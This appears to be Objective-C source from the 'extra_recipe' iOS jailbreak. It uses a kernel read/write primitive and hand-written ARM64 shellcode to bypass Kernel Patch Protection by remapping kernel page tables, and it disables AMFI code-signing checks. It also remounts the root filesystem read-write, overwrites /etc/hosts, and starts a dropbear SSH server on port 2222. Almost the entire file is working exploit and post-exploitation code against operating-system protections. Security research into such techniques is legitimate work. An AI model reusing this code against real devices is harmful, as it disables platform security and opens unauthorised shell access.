//
//  unjail.m
//  extra_recipe
//
//  Created by xerub on 16/05/2017.
//  Copyright © 2017 xerub. All rights reserved.
//  Copyright © 2017 qwertyoruiop. All rights reserved.
//

#include "unjail.h"
#include "offsets.h"
#include "kernel.h"
#include "libjb.h"

#include "Utilities.h"
// @qwertyoruiop's KPP bypass

#import "pte_stuff.h"

#include "patchfinder64.h"

#include "getshell.h"




kern_return_t kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide){
    
    kern_return_t ret = KERN_SUCCESS;
    
    checkvad();
    
    uint64_t entryp;
    
    int rv = init_kernel(kernbase, NULL);
    
    
    if(rv != 0) {
        printf("[ERROR]: could not initialize kernel\n");
        ret = KERN_FAILURE;
        goto cleanup;
    }
    
    printf("[INFO]: sucessfully initialized kernel\n");
    
    uint64_t gStoreBase = find_gPhysBase();
    
    gPhysBase = ReadAnywhere64(gStoreBase);
    gVirtBase = ReadAnywhere64(gStoreBase+8);
    
    entryp = find_entry() + slide;
    uint64_t rvbar = entryp & (~0xFFF);
    
    uint64_t cpul = find_register_value(rvbar+0x40, 1);
    
    uint64_t optr = find_register_value(rvbar+0x50, 20);
    if (uref) {
        optr = ReadAnywhere64(optr) - gPhysBase + gVirtBase;
    }
    printf("[INFO]: %llx\n", optr);
    
    uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
    uint64_t cpu = ReadAnywhere64(cpu_list);
    
    uint64_t pmap_store = find_kernel_pmap();
    printf("[INFO]: pmap: %llx\n", pmap_store);
    level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
    
    uint64_t shellcode = physalloc(0x4000);
    
    /*
     ldr x30, a
     ldr x0, b
     br x0
     nop
     a:
     .quad 0
     b:
     .quad 0
     none of that squad shit tho, straight gang shit. free rondonumbanine
     */
    
    WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
    WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
    
    WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
    WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
    WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
    
    char buf[0x100];
    copyin(buf, optr, 0x100);
    copyout(shellcode+0x300, buf, 0x100);
    
    uint64_t physcode = findphys_real(shellcode);
    
    printf("[INFO]: got phys at %llx for virt %llx\n", physcode, shellcode);
    
    uint64_t idlesleep_handler = 0;
    
    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
    int z = 0;
    
    int idx = 0;
    int ridx = 0;
    while (cpu) {
        cpu = cpu - gPhysBase + gVirtBase;
        if ((ReadAnywhere64(cpu+0x130) & 0x3FFF) == 0x100) {
            printf("[ERROR]: already jailbroken, bailing out\n");
            ret = KERN_ABORTED;
            goto cleanup;
        }
        
        
        if (!idlesleep_handler) {
            WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
            WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler
            
            idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
            
            
            uint32_t* opcz = malloc(0x1000);
            copyin(opcz, idlesleep_handler, 0x1000);
            idx = 0;
            while (1) {
                if (opcz[idx] == 0xd61f0000 /* br x0 */) {
                    break;
                }
                idx++;
            }
            ridx = idx;
            while (1) {
                if (opcz[ridx] == 0xd65f03c0 /* ret */) {
                    break;
                }
                ridx++;
            }
            
            
        }
        
        printf("[INFO]: found cpu %x\n", ReadAnywhere32(cpu+0x330));
        printf("[INFO]: found physz: %llx\n", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
        
        plist[z++] = cpu+0x130;
        cpu_list += 0x10;
        cpu = ReadAnywhere64(cpu_list);
    }
    
    
    uint64_t shc = physalloc(0x4000);
    
    uint64_t regi = find_register_value(idlesleep_handler+12, 30);
    uint64_t regd = find_register_value(idlesleep_handler+24, 30);
    
    printf("[INFO]: %llx - %llx\n", regi, regd);
    
    for (int i = 0; i < 0x500/4; i++) {
        WriteAnywhere32(shc+i*4, 0xd503201f);
    }
    
    /*
     isvad 0 == 0x4000
     */
    
    uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
    
    uint64_t ttbr0_real = find_register_value(idlesleep_handler + idx*4 + 24, 1);
    
    printf("[INFO]: ttbr0: %llx %llx\n",ReadAnywhere64(ttbr0_real), ttbr0_real);
    
    char* bbuf = malloc(0x4000);
    copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
    copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
    
    uint64_t physp = findphys_real(level0_pte);
    
    
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regi);
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    
    shc+=0x100;
    WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
    WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
    WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
    WriteAnywhere32(shc+12, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+16, 0xd5033f9f);  // dsb sy
    WriteAnywhere32(shc+20, 0xd5033b9f);  // dsb ish
    WriteAnywhere32(shc+24, 0xd5033fdf);  // isb
    WriteAnywhere32(shc+28, 0x5800007e); // ldr x30, 8
    WriteAnywhere32(shc+32, 0xd65f03c0); // ret
    WriteAnywhere64(shc+40, regd); /*handle deepsleep*/
    WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
    shc-=0x100;
    {
        int n = 0;
        WriteAnywhere32(shc+0x200+n, 0x18000148); n+=4; // ldr	w8, 0x28
        WriteAnywhere32(shc+0x200+n, 0xb90002e8); n+=4; // str		w8, [x23]
        WriteAnywhere32(shc+0x200+n, 0xaa1f03e0); n+=4; // mov	 x0, xzr
        WriteAnywhere32(shc+0x200+n, 0xd10103bf); n+=4; // sub	sp, x29, #64
        WriteAnywhere32(shc+0x200+n, 0xa9447bfd); n+=4; // ldp	x29, x30, [sp, #64]
        WriteAnywhere32(shc+0x200+n, 0xa9434ff4); n+=4; // ldp	x20, x19, [sp, #48]
        WriteAnywhere32(shc+0x200+n, 0xa94257f6); n+=4; // ldp	x22, x21, [sp, #32]
        WriteAnywhere32(shc+0x200+n, 0xa9415ff8); n+=4; // ldp	x24, x23, [sp, #16]
        WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp	x26, x25, [sp], #80
        WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
        
    }
    
    mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    mach_vm_address_t kppsh = 0;
    mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
    {
        int n = 0;
        
        WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr	x1, #60
        WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr	x0, #40
        WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr	TTBR1_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd2a00600); n+=4; // movz	x0, #0x30, lsl #16
        WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr	CPACR_EL1, x0
        WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr	TTBR1_EL1, x1
        WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr	x0, #-4
        WriteAnywhere32(kppsh+n, isvad ? 0xd5033b9f : 0xd503201f); n+=4; // dsb ish (4k) / nop (16k)
        WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi vmalle1 (4k) / tlbi	vae1, x30 (16k)
        WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
        WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
        WriteAnywhere64(kppsh+n, ReadAnywhere64(ttbr0_real)); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
        WriteAnywhere64(kppsh+n, physp); n+=8;
    }
    
    mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
    WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
    
    WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
    WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
    
    /*
     
     pagetables are now not real anymore, they're real af
     
     */
    
    uint64_t cpacr_addr = find_cpacr_write();
#define PSZ (isvad ? 0x1000 : 0x4000)
#define PMK (PSZ-1)
    
    
#define RemapPage_(address) \
pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
uint64_t tte = ReadAnywhere64(tte_addr);\
if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
printf("[INFO]: breakup!\n");\
uint64_t fakep = physalloc(PSZ);\
uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
TTE_SETB(tte, TTE_IS_TABLE_MASK);\
for (int i = 0; i < PSZ/8; i++) {\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
WriteAnywhere64(fakep+i*8, tte);\
}\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
WriteAnywhere64(tte_addr, tte);\
}\
uint64_t newt = physalloc(PSZ);\
copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
copyout(newt, bbuf, PSZ);\
TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
WriteAnywhere64(tte_addr, tte);\
}, level1_table, isvad ? 1 : 2);
    
#define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
    
    uint64_t* remappage = calloc(512, 8);
    
    int remapcnt = 0;
    
    
#define RemapPage(x)\
{\
int fail = 0;\
for (int i = 0; i < remapcnt; i++) {\
if (remappage[i] == (x & (~PMK))) {\
fail = 1;\
}\
}\
if (fail == 0) {\
RemapPage_(x);\
RemapPage_(x+PSZ);\
remappage[remapcnt++] = (x & (~PMK));\
}\
}
    
    level1_table = physp - gPhysBase + gVirtBase;
    WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
    
    
    uint64_t shtramp = kernbase + ((const struct mach_header *)find_mh())->sizeofcmds + sizeof(struct mach_header_64);
    RemapPage(cpacr_addr);
    WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));
    
    RemapPage(shtramp);
    WriteAnywhere32(NewPointer(shtramp), 0x58000041);
    WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
    WriteAnywhere64(NewPointer(shtramp)+8, kppsh);
    
    uint64_t lwvm_write = find_lwvm_mapio_patch();
    uint64_t lwvm_value = find_lwvm_mapio_newj();
    RemapPage(lwvm_write);
    WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
    
    
    uint64_t kernvers = find_str("Darwin Kernel Version");
    uint64_t release = find_str("RELEASE_ARM");
    
    RemapPage(kernvers-4);
    WriteAnywhere32(NewPointer(kernvers-4), 1);
    
    RemapPage(release);
    if (NewPointer(release) == (NewPointer(release+11) - 11)) {
        copyout(NewPointer(release), "hongs", 11); /* hongs */
    }
    
    
    /*
     nonceenabler
     */
    
    {
        uint64_t sysbootnonce = find_sysbootnonce();
        printf("[INFO]: nonce: %x\n", ReadAnywhere32(sysbootnonce));
        
        WriteAnywhere32(sysbootnonce, 1);
    }
    
    
    /*
     amfid patch
     */
    
    uint64_t memcmp_got = find_amfi_memcmpstub();
    uint64_t ret1 = find_ret_0();
    
    RemapPage(memcmp_got);
    WriteAnywhere64(NewPointer(memcmp_got), ret1);
    
    uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
    printf("[INFO]: fref at %llx\n", fref);
    
    uint64_t amfiops = find_amfiops();
    
    printf("[INFO]: amfistr at %llx\n", amfiops);
    
    {
        /* amfi */
        uint64_t sbops = amfiops;
        uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
        
        uint64_t nopag = sbops_end - sbops;
        
        for (int i = 0; i < nopag; i+= PSZ)
            RemapPage(((sbops + i) & (~PMK)));
        
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
    }
    
    /*
     first str
     */
    while (1) {
        uint32_t opcode = ReadAnywhere32(fref);
        if ((opcode & 0xFFC00000) == 0xF9000000) {
            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
            int32_t myreg = (opcode >> 5) & 0x1f;
            uint64_t rgz = find_register_value(fref, myreg)+outhere;
            
            WriteAnywhere64(rgz, physcode+0x200);
            break;
        }
        fref += 4;
    }
    
    fref += 4;
    
    /*
     second str
     */
    while (1) {
        uint32_t opcode = ReadAnywhere32(fref);
        if ((opcode & 0xFFC00000) == 0xF9000000) {
            int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
            int32_t myreg = (opcode >> 5) & 0x1f;
            uint64_t rgz = find_register_value(fref, myreg)+outhere;
            
            WriteAnywhere64(rgz, physcode+0x100);
            break;
        }
        fref += 4;
    }
    // amfid patch
    {
        uint64_t point = find_amfiret()-0x18;
        
        RemapPage((point & (~PMK)));
        uint64_t remap = NewPointer(point);
        
        assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
        
        WriteAnywhere32(remap, 0x58000041);
        WriteAnywhere32(remap + 4, 0xd61f0020);
        WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
        
    }
    
    for (int i = 0; i < z; i++) {
        WriteAnywhere64(plist[i], physcode + 0x100);
    }
    
    while (ReadAnywhere32(kernvers-4) != 1) {
        sleep(1);
    }
    
    printf("[INFO]: enabled patches\n");
    
cleanup:
    return ret;
}


void remount_rw(void){
    
    struct utsname uts;
    uname(&uts);
    
    vm_offset_t off = 0xd8;
    if (strstr(uts.version, "16.0.0")) {
        off = 0xd0;
    }
    
    uint64_t _rootvnode = find_gPhysBase() + 0x38;
    uint64_t rootfs_vnode = kread_uint64(_rootvnode);
    uint64_t v_mount = kread_uint64(rootfs_vnode + off);
    uint32_t v_flag = kread_uint32(v_mount + 0x71);
    
    kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));
    
    char *nmz = strdup("/dev/disk0s1s1");
    int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
    printf("rv: %d (flags: 0x%x) %s \n", rv, v_flag, strerror(errno));
    
    if(rv == -1) {
        printf("[ERROR]: could not mount '/': %d\n", rv);
    } else {
        printf("[INFO]: successfully mounted '/'\n");
    }
    
    v_mount = kread_uint64(rootfs_vnode + off);
    kwrite_uint32(v_mount + 0x71, v_flag);
    
}
kptr_t kernel_slide = 0;

kern_return_t go_extra_recipe() {
    
    kern_return_t ret = KERN_SUCCESS;
    
    uint64_t calculated_kernel_base = RAW_OFFSET(kernel_text) + kernel_slide;
    printf("[INFO]: passed kernel_base: %llx\n", calculated_kernel_base);
    ret = kpp(1, 0, calculated_kernel_base, kernel_slide);
    remount_rw();
    return ret;
}


kern_return_t load_payload(int reload){
    
    char path[4096];
    uint32_t size = sizeof(path);
    _NSGetExecutablePath(path, &size);
    char *pt = realpath(path, NULL);
    
    pid_t pd = 0;
    NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
    
    NSString *tar = [execpath stringByAppendingPathComponent:@"tar-sig"];
    NSString *bash = [execpath stringByAppendingPathComponent:@"bash-arm64-sig"];
    NSString *dropbear = [execpath stringByAppendingPathComponent:@"dropbear-sig"];
    NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
    NSString *profile = [execpath stringByAppendingPathComponent:@"profile"];
    NSString *hosts = [execpath stringByAppendingPathComponent:@"hosts"];
    
    chdir("/tmp");
    mkdir("/tmp/etc", 0775);
    mkdir("/tmp/etc/dropbear", 0775);
    
    // copy file
    copyfile([tar UTF8String], "/tmp/tar-sig", 0, COPYFILE_ALL);
    //copyfile([bash UTF8String], "/bin/sh", 0, COPYFILE_ALL);
    copyfile([bash UTF8String], "/tmp/bash-arm64-sig", 0, COPYFILE_ALL);
    copyfile([dropbear UTF8String], "/tmp/dropbear-sig", 0, COPYFILE_ALL);
    copyfile([profile UTF8String], "/var/root/.profile", 0, COPYFILE_ALL);
    copyfile([hosts UTF8String], "/etc/hosts", 0, COPYFILE_ALL);
    
    //chmod
    chmod("/tmp/tar-sig", 0755);
    //  chmod("/bin/sh", 0755);
    chmod("/tmp/bash-arm64-sig", 0755);
    chmod("/tmp/dropbear-sig", 0755);
    
    //set env
    //char* envp[] = {init_env(), NULL};
    //printf("envp : %s\n",envp[0]);
    
    //exec cmd
    /*	posix_spawn(&pd, "/tmp/tar-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/tar-sig", "--preserve-permissions", "--no-overwrite-dir", "-xf", [bootstrap UTF8String], NULL }, NULL);
     NSLog(@"pid = %x", pd);
     waitpid(pd, NULL, 0);
     sleep(1);*/
    /* untar bootstrap.tar */
    printf("untar and drop bootstrap.tar into /tmp\n");
    FILE *a = fopen([bootstrap UTF8String], "rb");
    chdir("/tmp");
    untar(a, "bootstrap");
    fclose(a);
    
    
    //launch dropbear
    posix_spawn(&pd, "/tmp/dropbear-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/dropbear-sig", "-RE", "-p", "2222", NULL }, NULL);
    NSLog(@"pid = %x", pd);
    waitpid(pd, NULL, 0);
    
    // getshell
    
    //getshell();
    
    
    return 0;
}



